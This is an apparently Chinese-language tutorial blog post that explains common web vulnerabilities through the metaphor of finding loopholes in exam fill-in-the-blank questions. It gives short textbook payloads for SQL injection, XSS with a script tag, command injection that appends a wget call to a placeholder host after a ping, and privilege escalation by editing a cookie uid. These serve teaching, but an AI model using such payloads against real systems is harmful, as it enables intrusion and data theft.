第一项：填写信息


这个地方会有漏洞吗？


有！


考生的个人信息都填在这儿，没有做任何保护措施。

只要偷瞄一下试卷上的信息，然后在另一张试卷填写瞄到的“姓名和学号”就可成功伪装出该身份。


漏洞攻击成就达成！


一、诗词填写

1、床前明月光，___________。

2、春眠不觉晓，___________。


小学生都会做的诗歌填写，会有漏洞吗？


有！


这道题的答案本来应该是“疑似地上霜”和“处处闻啼鸟”。

But，题干并没有明确规定答案里不能添加标点符号。所以，完全可以把“疑是地上霜，举头望明月，低头思故乡”以及“处处闻啼鸟，夜来风雨声，花落知多少”当做答案写进去。



再次进攻成功！


二、数学运算（在括号内填入数字）
3500 + 400 * 3 / 2 + 1 = （ ） 
4 ( 1 + 2 ) / 3 * 400 +500 = （ ）


这道题会有漏洞吗？


有！


出题者规定了只能填入数字，但却没有说是什么数字，也没有规定多少位，那么答案可以是 中文数字「壹佰壹拾圆」、罗马数字「MCI」或「0000000000001101」。




第三次进攻成功


三、SQL 注入


所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。


select * from username = ____ and password=_____



如何进攻？



select * from username = "test" or ""="" and password="123456"




SQL 注入成功！


四、XSS


攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。


 <p style='color:red'>你好啊，尊敬的______<p>



如何进攻？



 <p style='color:red'>你好啊，尊敬的 xxx<script>alert(1)</script><p>




XSS攻击成就达成！


五、远程命令执行


用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致执行命令


 ping _______ 



如何进攻？


ping www.baidu.com & wget xxxxxxxxxxx




远程命令执行成功！


六、越权


越权漏洞是比较常见的漏洞类型，越权漏洞可以理解为，一个正常的用户A通常只能够对自己的一些信息进行增删改查，但是由于程序员的一时疏忽在对信息进行增删改查的时候没有进行一个判断，判断所需要操作的信息是否属于对应的用户，可以导致用户A可以操作其他人的信息。


 Cookie: uid=11426;



如何进攻？


Cookie: uid=1;




越权成就达成！

常见 Web 漏洞的攻击思想


我们打开一个网页提交登录或者是搜索都会经过服务器做一系列的处理又回到浏览器，在这个过程中我们提交的数据会被带入到一系列的填空题中，有的是我们能猜到的，有的是意想不到的，有的会经过SQL进行查询进行填空，有的会被带入到命令行中进行填空，最后又把结果返回给浏览器进行填空，最后也就是我们得到的结果了。



了解了这几个漏洞之后我们可以看到原理都类似。

当我们不再局限于概念名词时就会发现 web 安全的大部分漏洞都很简单。

发现一个复杂的漏洞需要的只是耐心。
